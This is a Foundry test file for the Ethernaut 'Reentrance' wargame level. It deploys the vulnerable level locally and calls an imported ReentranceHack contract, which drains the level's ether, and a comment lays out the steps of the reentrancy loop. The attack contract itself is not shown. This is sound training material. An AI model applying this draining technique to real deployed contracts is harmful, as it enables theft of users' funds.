// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Reentrance/ReentranceFactory.sol";
import "../src/Reentrance/ReentranceHack.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

// forge test --match-contract ReentranceTest -vvvv
contract ReentranceTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our address 5 ether
    }

    function testReentranceHack() public {
        /****************
         * Factory setup *
         *************** */
        ReentranceFactory reentranceFactory = new ReentranceFactory();
        ethernaut.registerLevel(reentranceFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(
            reentranceFactory
        );
        Reentrance ethernautReentrance = Reentrance(payable(levelAddress));
        /****************
         *    Attack     *
         *************** */
        uint256 initialLevelBalance = address(ethernautReentrance).balance;
        assertEq(initialLevelBalance, 1 ether);
        /*
         * This is a perfect example of reentrancy vulnerabity.
         * In this case, in the withdraw function in ethernautReentrance, the code
         * will check directly the balance of the msg.sender, which is player here.
         * 1) we call the attack function with 0.1 eth
         * 2) the function will donate an initial deposit with the contract address
         * 3) it will call callWithdraw until the challenge balance is dry
         * 4) receive function of the contract is called once first withdraw is triggered
         * 5) ... That triggers again the loop until there no funds
         **/
        ReentranceHack ReentranceHack = new ReentranceHack(levelAddress);
        ReentranceHack.attack{value: 0.1 ether}();
        uint256 levelBalance = address(ethernautReentrance).balance;
        assertEq(levelBalance, 0);

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
